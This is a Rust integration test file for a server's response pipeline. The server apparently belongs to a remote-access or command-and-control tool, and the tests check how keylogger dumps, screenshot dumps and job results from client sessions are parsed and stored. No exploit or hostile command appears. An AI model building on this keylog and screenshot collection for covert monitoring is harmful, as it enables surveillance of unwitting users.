// tests/test_response_pipeline.rs - process_response pipeline integration
// tests for the marker-handling
//   * ordinary output merely CONTAINING a dump marker must pass through
//     untouched (no hijack, no artifact minting);
//   * an empty KEYLOG_DUMP must COMPLETE the request (results-map entry +
//     DB row) instead of being swallowed;
//   * a real dump persists the ORIGINAL raw output to the DB while the
//     operator-facing results map gets the extraction status message.

use rcm::common::CommandResponse;
use rcm::database::DbPool;
use rcm::api::SharedResults;
use rcm::server::session::process_response;

use std::collections::HashMap;
use std::sync::{Arc, Mutex};

fn temp_db() -> DbPool {
    let path = format!("/tmp/rcm_test_pipeline_{}.db", uuid::Uuid::new_v4());
    let manager = r2d2_sqlite::SqliteConnectionManager::file(&path)
        .with_init(|c| c.execute_batch(
            "PRAGMA journal_mode = WAL; PRAGMA synchronous = NORMAL; PRAGMA busy_timeout = 5000;"
        ));
    let pool = r2d2::Pool::builder().max_size(2).build(manager).unwrap();
    let conn = pool.get().unwrap();
    conn.execute_batch(
        "CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            session_uuid TEXT,
            exe_id TEXT,
            computer_id TEXT,
            hostname TEXT,
            os TEXT,
            ip_address TEXT,
            build_id TEXT,
            connected_at TEXT,
            is_active INTEGER DEFAULT 0,
            profile TEXT DEFAULT 'default'
         );
         CREATE TABLE IF NOT EXISTS client_outputs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id INTEGER,
            request_id INTEGER,
            output TEXT,
            error TEXT,
            timestamp TEXT
         );"
    ).unwrap();
    pool
}

fn results() -> SharedResults {
    Arc::new(Mutex::new(HashMap::new()))
}

fn resp(request_id: u64, output: &str) -> CommandResponse {
    CommandResponse {
        request_id,
        output: output.to_string(),
        error: String::new(),
        exit_code: 0,
    }
}

/// The DB write is spawned (not awaited) by process_response; poll briefly.
fn wait_db_output(pool: &DbPool, sess_id: u32, req_id: u64) -> Option<String> {
    for _ in 0..50 {
        {
            let conn = pool.get().unwrap();
            let row: Result<String, _> = conn.query_row(
                "SELECT output FROM client_outputs WHERE session_id = ?1 AND request_id = ?2",
                rusqlite::params![sess_id, req_id as i64],
                |r| r.get(0),
            );
            if let Ok(o) = row { return Some(o); }
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    None
}

#[tokio::test]
async fn substring_marker_mention_is_not_hijacked() {
    let pool = temp_db();
    let results = results();
    let original = "user typed: echo KEYLOG_DUMP: is not a dump";
    process_response(42, resp(7, original), &results, &pool).await;

    let stored = results.lock().unwrap().get(&(42, 7)).cloned()
        .expect("results entry must exist");
    assert_eq!(stored.output, original, "ordinary output must pass through untouched");

    let db_out = wait_db_output(&pool, 42, 7).expect("DB row must exist");
    assert_eq!(db_out, original);
}

#[tokio::test]
async fn job_final_without_marker_is_not_hijacked() {
    let pool = temp_db();
    let results = results();
    // JOB_FINAL wrapper whose payload merely MENTIONS the marker.
    process_response(42, resp(8, "JOB_FINAL:3|see KEYLOG_DUMP: docs"), &results, &pool).await;

    let stored = results.lock().unwrap().get(&(42, 8)).cloned()
        .expect("results entry must exist");
    // The JOB_FINAL branch stores the unwrapped payload, unchanged.
    assert_eq!(stored.output, "see KEYLOG_DUMP: docs");
}

#[tokio::test]
async fn empty_keylog_dump_completes_instead_of_hanging() {
    let pool = temp_db();
    let results = results();
    process_response(42, resp(9, "KEYLOG_DUMP:"), &results, &pool).await;

    let stored = results.lock().unwrap().get(&(42, 9)).cloned()
        .expect("empty dump must still complete the request");
    assert!(stored.output.contains("nothing captured"),
        "unexpected output: {}", stored.output);

    let db_out = wait_db_output(&pool, 42, 9).expect("DB row must exist for empty dump");
    assert!(db_out.contains("nothing captured"));
}

#[tokio::test]
async fn empty_keylog_dump_inside_job_final_completes() {
    let pool = temp_db();
    let results = results();
    process_response(42, resp(10, "JOB_FINAL:5|KEYLOG_DUMP:  "), &results, &pool).await;

    let stored = results.lock().unwrap().get(&(42, 10)).cloned()
        .expect("empty wrapped dump must still complete the request");
    assert!(stored.output.contains("nothing captured"),
        "unexpected output: {}", stored.output);
}

#[tokio::test]
async fn real_dump_keeps_raw_output_in_db_status_in_results() {
    let pool = temp_db();
    let results = results();
    // A non-empty dump for a session with NO session row: extraction fails
    // (no RCM package), but the raw payload must STILL land in the DB and
    // the results map must carry the status message, not the payload.
    let raw = "KEYLOG_DUMP:{\"type\":\"keystroke\",\"timestamp\":1,\"data\":{\"key\":\"a\"}}";
    process_response(42, resp(11, raw), &results, &pool).await;

    let stored = results.lock().unwrap().get(&(42, 11)).cloned()
        .expect("results entry must exist");
    assert_eq!(stored.output, "Keylog extraction failed");

    let db_out = wait_db_output(&pool, 42, 11).expect("DB row must exist");
    assert_eq!(db_out, raw, "DB must keep the ORIGINAL raw dump output");
}

#[tokio::test]
async fn screenshot_substring_mention_is_not_hijacked() {
    let pool = temp_db();
    let results = results();
    let original = "run SCREENSHOT_DUMP: to capture";
    process_response(42, resp(12, original), &results, &pool).await;

    let stored = results.lock().unwrap().get(&(42, 12)).cloned()
        .expect("results entry must exist");
    assert_eq!(stored.output, original);
}